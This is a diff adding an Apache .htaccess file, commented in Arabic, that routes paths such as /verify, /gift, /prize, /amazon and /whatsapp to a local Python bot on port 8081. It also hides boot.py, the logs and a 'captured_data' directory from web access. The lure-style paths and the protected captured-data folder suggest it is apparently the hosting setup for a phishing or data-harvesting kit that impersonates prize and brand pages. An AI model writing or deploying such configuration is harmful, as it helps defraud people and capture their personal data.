@@ -1,0 +1,30 @@
+# إعداد Apache للتوجيه للبوت Python
+# ضع هذا الملف في public_html/
+
+RewriteEngine On
+
+# توجيه طلبات البوت إلى البورت 8081
+RewriteCond %{REQUEST_URI} ^/(verify|gift|prize|update|amazon|whatsapp)/?$
+RewriteRule ^(.*)$ http://localhost:8081/$1 [P,L]
+
+# السماح بالوصول للملفات الثابتة
+RewriteCond %{REQUEST_URI} \.(css|js|png|jpg|jpeg|gif|ico|svg)$ [NC]
+RewriteRule ^(.*)$ - [L]
+
+# إعدادات الأمان
+<Files "boot.py">
+    Require all denied
+</Files>
+
+<Files "*.log">
+    Require all denied
+</Files>
+
+<Directory "captured_data">
+    Require all denied
+</Directory>
+
+# إعدادات CORS للـ API
+Header always set Access-Control-Allow-Origin "*"
+Header always set Access-Control-Allow-Methods "GET, POST, OPTIONS"
+Header always set Access-Control-Allow-Headers "Content-Type"
